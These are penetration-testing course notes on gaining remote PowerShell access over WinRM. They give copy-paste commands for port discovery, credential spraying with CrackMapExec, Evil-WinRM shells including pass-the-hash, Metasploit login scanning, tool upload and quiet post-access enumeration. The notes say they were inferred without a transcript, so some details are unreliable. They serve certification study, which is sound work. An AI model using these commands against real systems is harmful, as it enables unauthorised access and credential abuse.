# 06 - Exploiting WinRM (Windows Remote Management Protocol)

Note: No transcript was provided. The following summary is inferred conservatively from the filename and typical eJPT Windows exploitation workflows for WinRM.

## What the video covers (Introduction / big picture)
- Identifying and exploiting Windows Remote Management (WinRM) to gain a remote PowerShell shell.
- Understanding WinRM endpoints and ports:
  - HTTP: 5985 (default)
  - HTTPS: 5986 (requires SSL/TLS)
- Validating credentials and achieving command execution via WinRM.
- Using Evil-WinRM for an interactive shell, CrackMapExec for quick validation/command execution, and Metasploit for credential testing.
- Practical post-auth actions: enumeration, file transfer, and living-off-the-land via PowerShell.

## Flow (ordered)
1. Discover WinRM exposure with port and service enumeration (5985/5986).
2. Probe the WinRM HTTP endpoint to confirm WS-Management service.
3. Validate credentials against WinRM (single creds and/or lists).
4. Obtain an interactive shell using Evil-WinRM (HTTP or HTTPS).
5. Post-auth enumeration and file transfer inside the remote PowerShell session.
6. Troubleshoot common WinRM connection errors (ports, SSL, privileges).
7. Optional: Use Metasploit modules to brute/validate credentials or execute scripts.

## Tools highlighted
- Nmap: Port/service detection and HTTP auth fingerprinting.
- curl: Quick check of the WinRM WS-Management endpoint.
- CrackMapExec (cme): Credential validation and one-off command execution over WinRM.
- Evil-WinRM: Interactive PowerShell shell via WinRM; upload/download helpers.
- Metasploit: auxiliary/scanner/winrm/winrm_login (and related modules; use search winrm).
- PowerShell (on target): System/domain enumeration commands.

## Typical command walkthrough (detailed, copy-paste friendly)

Set a target environment variable for convenience:
```bash
export TARGET=10.10.10.10
```

1) Scan for WinRM (ports and basic service info)
```bash
nmap -p 5985,5986 -sV -sC -oN nmap_winrm_$TARGET.txt $TARGET
```

Optionally, fingerprint Windows/NTLM hints on the HTTP WinRM endpoint:
```bash
nmap -p5985 --script http-ntlm-info,http-title -oN nmap_winrm_http_$TARGET.txt $TARGET
```

Quick manual probe of the WS-Management endpoint (expect HTTP 401 with WWW-Authenticate):
```bash
curl -i http://$TARGET:5985/wsman
```

2) Validate credentials with CrackMapExec (single credential)
```bash
# Local admin or known user (workgroup)
cme winrm $TARGET -u Administrator -p 'P@ssw0rd!' -x 'whoami /all'

# Domain user (if joined to a domain)
cme winrm $TARGET -d DOMAIN.LOCAL -u jdoe -p 'Summer2025!' -x 'hostname'
```

Validate lists of users/passwords:
```bash
cme winrm $TARGET -u users.txt -p passwords.txt
```

3) Connect with Evil-WinRM (interactive shell)
```bash
# Workgroup/local account over HTTP (5985)
evil-winrm -i $TARGET -u Administrator -p 'P@ssw0rd!'

# Domain account (note: use -d for domain)
evil-winrm -i $TARGET -u jdoe -p 'Summer2025!' -d DOMAIN.LOCAL

# HTTPS listener (5986)
evil-winrm -i $TARGET -u Administrator -p 'P@ssw0rd!' -S -P 5986
```

Pass-the-Hash (if you have the NTLM hash; Evil-WinRM supports NTLM auth):
```bash
# LM:NT format accepted; LM can be aad3b435b51404eeaad3b435b51404ee if unknown
evil-winrm -i $TARGET -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'
```

4) Inside Evil-WinRM: quick recon and file ops
```powershell
whoami /all
hostname
ipconfig /all

# Local user/group checks
net user
net localgroup administrators

# Check users and home dirs
Get-ChildItem C:\Users

# Environment and system
$env:COMPUTERNAME
$PSVersionTable
systeminfo

# File transfers
upload /home/kali/tools/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe
download C:\Windows\System32\drivers\etc\hosts

# Explore Evil-WinRM helpers
menu
help
```

5) Metasploit alternative (credential testing and execution)
```bash
msfconsole
```
```text
msf6 > search winrm
msf6 > use auxiliary/scanner/winrm/winrm_login
msf6 auxiliary(scanner/winrm/winrm_login) > set RHOSTS $TARGET
msf6 auxiliary(scanner/winrm/winrm_login) > set RPORT 5985
msf6 auxiliary(scanner/winrm/winrm_login) > set USERNAME Administrator
msf6 auxiliary(scanner/winrm/winrm_login) > set PASSWORD P@ssw0rd!
# For HTTPS endpoint:
# msf6 ... > set RPORT 5986
# msf6 ... > set SSL true
msf6 auxiliary(scanner/winrm/winrm_login) > run
```
If you want scripted execution via WinRM, use search winrm and select an appropriate module (names can vary by version, e.g., exploit/windows/winrm/winrm_script_exec). Configure RHOSTS/USERNAME/PASSWORD and run.

6) Installation notes (Kali)
```bash
# Evil-WinRM (Kali)
sudo apt update && sudo apt install -y evil-winrm

# CrackMapExec (if missing)
sudo apt install -y crackmapexec
```

## Practical tips
- Ports: Try 5985 first (HTTP). If closed but 5986 is open, use Evil-WinRM with -S -P 5986.
- Auth types: Workgroup targets typically use NTLM; domain targets may use NTLM or Kerberos. For domain users, supply -d DOMAIN.
- Permissions: Successful auth doesn’t always imply remote command execution. Users generally need to be Administrators or be in the “Remote Management Users” group to run commands via WinRM.
- Errors:
  - Access is denied: Credentials valid but insufficient privilege for WinRM; try another user or escalate membership.
  - Connection refused/timeout: Firewall or service disabled. Verify with nmap and curl. Consider other remote exec vectors (SMB, WMI) if WinRM isn’t available.
  - SSL issues on 5986: Use Evil-WinRM -S and accept self-signed certs; set the correct port with -P 5986.
- Post-auth: Use built-in Windows commands and PowerShell for low-noise enumeration before bringing external tools; then upload what you need to C:\Windows\Temp or another writable path.
- OPSEC: Prefer living-off-the-land (net, whoami, Get-*) and avoid noisy tooling unless necessary.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover WinRM
export TARGET=10.10.10.10
nmap -p 5985,5986 -sV -sC -oN nmap_winrm_$TARGET.txt $TARGET
curl -i http://$TARGET:5985/wsman

# 2) Validate creds
cme winrm $TARGET -u Administrator -p 'P@ssw0rd!' -x 'whoami /all'
# or domain
cme winrm $TARGET -d DOMAIN.LOCAL -u jdoe -p 'Summer2025!' -x 'hostname'

# 3) Get a shell
evil-winrm -i $TARGET -u Administrator -p 'P@ssw0rd!'            # HTTP 5985
evil-winrm -i $TARGET -u Administrator -p 'P@ssw0rd!' -S -P 5986  # HTTPS 5986
# Pass-the-Hash (if available)
evil-winrm -i $TARGET -u Administrator -H 'LMHASH:NTHASH'

# 4) Inside shell
whoami /all
hostname && ipconfig /all
net user
net localgroup administrators
upload /home/kali/file C:\Windows\Temp\file
download C:\path\to\target\file

# Troubleshoot: denied = insufficient rights; timeout/refused = firewall/service; 5986 needs -S -P 5986
```

## Summary
- WinRM (5985/5986) provides remote PowerShell access; it’s a reliable post-credential vector on many Windows servers and domain-joined hosts.
- Enumerate ports, verify the WS-Management endpoint, then validate credentials with CrackMapExec or Metasploit.
- Use Evil-WinRM for an interactive shell (password or NTLM hash), choosing HTTP or HTTPS as exposed.
- Once in, enumerate quietly, transfer needed tools, and proceed with privilege escalation or lateral movement.
- Handle common issues by checking ports, SSL usage, and required group memberships for remote management.